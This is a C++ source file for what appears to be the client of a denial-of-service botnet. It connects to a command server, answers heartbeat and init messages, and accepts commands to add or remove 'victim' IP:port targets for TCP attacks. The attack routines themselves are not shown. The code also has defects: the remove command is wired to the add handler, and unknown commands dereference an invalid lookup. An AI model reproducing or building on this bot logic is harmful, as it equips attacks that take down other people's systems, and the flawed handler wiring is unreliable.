#include "client.h"

#ifdef NDEBUG
#define PRINT(a, b)
#else
#define PRINT(a, b) std::cout << "[DEBUG]: " << (a) << (b) << std::endl;
#endif

client::client(io::io_context& io_context, std::uint16_t port, std::string server_ip, std::uint16_t server_port, victims* victims)
    : io_context_(io_context),
      acceptor_(io_context, tcp::endpoint(tcp::v4(), port)),
      server_ip_(server_ip),
      server_port_(server_port),
      victims_(victims) {
	command_handlers_ = {
	    {"[ARE_YOU_ALIVE]",
	     boost::bind(&client::handleAlive, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
	    {"[INIT]",
	     boost::bind(&client::handleInit, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
	    {"[ADD_CLIENT_VICTIM]",
		boost::bind(&client::handleAddClientVictim, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
	    {"[REMOVE_CLIENT_VICTIM]",
		boost::bind(&client::handleAddClientVictim, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
	};
}

void client::start() {
	tcp::socket socket(io_context_);
	socket_ = std::move(socket);

	err error;
	tcp::endpoint endpoint(io::ip::make_address(server_ip_), server_port_);

	socket_->connect(endpoint, error);

	auto server = server_session_container_.emplace_back(std::make_shared<session>(std::move(*socket_), io_context_, 1));

	server->start(boost::bind(&client::handleResponse, this, boost::placeholders::_1, boost::placeholders::_2));

	std::vector<std::string> output_params;
	std::string command = "[INIT]";
	server->send(msg_parser_.genCommand(command, output_params));
	server->read();
}

void client::handleResponse(std::string& query, session* server) {
	PRINT(server->endpoint_, (": " + query));

	auto parsed_msg = msg_parser_.parse_msg(query);

	if (parsed_msg["is_valid_msg"][0] == "false") {
		return;
	}
	auto handler = command_handlers_.find(parsed_msg["command"][0])->second;
	if (handler) handler(parsed_msg["command"][0], parsed_msg["params"], server);
}

void client::handleAlive(std::string& command, std::vector<std::string>& params, session* client) {
	std::vector<std::string> output_params = {"1"};
	client->send(msg_parser_.genCommand(command, output_params));
}

void client::handleInit(std::string& command, std::vector<std::string>& params, session* client) {
	PRINT("Connected succesfully", "");
}

void client::handleAddClientVictim(std::string& command, std::vector<std::string>& params, session* client) {
	std::string victim_ip_to_add = params[0];
	std::vector<std::string> victim_ip_port_split;
	boost::split(victim_ip_port_split, victim_ip_to_add, boost::is_any_of(":"), boost::token_compress_on);

	victims_->add_tcp_victim(victim_ip_port_split[0].c_str(), victim_ip_port_split[1].c_str());
	std::cout << "Adding this victim on client_side-> IP:  " << victim_ip_port_split[0] << " PORT: " << victim_ip_port_split[1] << "\n";
}

void client::handleRemoveClientVictim(std::string& command, std::vector<std::string>& params, session* client) {

	std::string victim_ip_to_remove = params[0];
	std::vector<std::string> victim_ip_port_split;
	boost::split(victim_ip_port_split, victim_ip_to_remove, boost::is_any_of(":"), boost::token_compress_on);

	victims_->remove_victim(victim_ip_port_split[0].c_str(), victim_ip_port_split[1].c_str());
	std::cout << "Removing this victim on client_side-> IP:  " << victim_ip_port_split[0] << " PORT: " << victim_ip_port_split[1] << "\n";

}